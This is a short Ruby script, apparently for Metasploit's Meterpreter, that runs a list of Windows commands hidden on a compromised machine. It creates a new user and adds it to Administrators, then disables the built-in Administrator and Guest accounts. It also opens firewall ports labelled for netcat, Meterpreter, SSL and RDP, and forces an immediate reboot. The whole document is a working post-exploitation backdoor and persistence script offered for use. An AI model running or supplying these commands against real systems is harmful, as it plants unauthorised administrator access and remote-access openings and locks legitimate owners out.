def list_exec(session,cmdlst)
    print_status("Running Command List ...")
    r=''
    session.response_timeout=120
    cmdlst.each do |cmd|
       begin
          print_status "running command #{cmd}"
          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
          while(d = r.channel.read)
 
             print_status("t#{d}")
          end
          r.channel.close
          r.close
       rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
       end
    end
 end
 
 commands = ["net user Username password",
	"net localgroup Administrators Username /add",
	"net user Administrator /active:no",
	"net user Guest /active:no",
	"netsh advfirewall firewall add rule name=’netcat’ dir=in action=allow protocol=Tcp localport=4445",
	"netsh advfirewall firewall add rule name=’Meterpreter’ dir=in action=allow protocol=Tcp localport=4444",
	"netsh advfirewall firewall add rule name=’ssl’ dir=in action=allow protocol=Tcp localport=443",
	"netsh advfirewall firewall add rule name=’RDP’ dir=in action=allow protocol=Tcp localport=3389",
	"netsh firewall add portopening tcp 4444 meterpreter",
	"netsh firewall add portopening tcp 3389 RDP",
	"netsh firewall add portopening tcp 443 ssl",
	"netsh firewall add portopening tcp 4445 netcat",
	"netsh firewall set opmode enable enable",
	"netsh advfirewall set allprofiles state on",
	"shutdown /r /t 0"]
 
 list_exec(client,commands)
